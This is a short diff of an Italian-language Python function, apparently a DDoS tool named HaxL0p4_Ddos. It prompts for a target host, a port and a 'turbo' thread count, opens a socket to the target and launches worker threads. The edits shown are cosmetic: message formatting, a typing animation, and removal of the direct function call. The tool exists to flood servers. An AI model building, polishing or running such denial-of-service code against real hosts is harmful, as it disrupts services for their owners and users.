@@ -196,8 +196,8 @@ def HaxL0p4_Ddos():
         port = input(f" Inserisci il numero della porta (default 80) {Fore.CYAN}>{Style.RESET_ALL}  ") or 80
         thr = input(f" Inserisci il valore turbo (default 135) {Fore.CYAN}>{Style.RESET_ALL} ") or 135
 
-        print(f"\033[92m{host} porta: {str(port)} turbo: {str(thr)}\033[0m")
-        print("\033[94mAttendi...\033[0m")
+        print(f"\n\033[92m {host} porta: {str(port)} turbo: {str(thr)}\033[0m")
+        animazione_lettere("\033[94m Attendi...\033[0m", 0.03)
 
     # Inizializzazione delle code
     q = Queue()
@@ -220,7 +220,7 @@ def HaxL0p4_Ddos():
         s.connect((host,int(port)))
         s.settimeout(1)
     except socket.error as e:
-        print("\033[91mControlla l'indirizzo del server e la porta\033[0m")
+        print("\033[91m Controlla l'indirizzo del server e la porta\033[0m")
         sys.exit()
 
     # Creazione e avvio dei thread
@@ -244,12 +244,6 @@ def HaxL0p4_Ddos():
 
     q.join()
     w.join()
-
-# Chiamata alla funzione HaxL0p4_Ddos()
-HaxL0p4_Ddos()
-
-
-
 
 
 
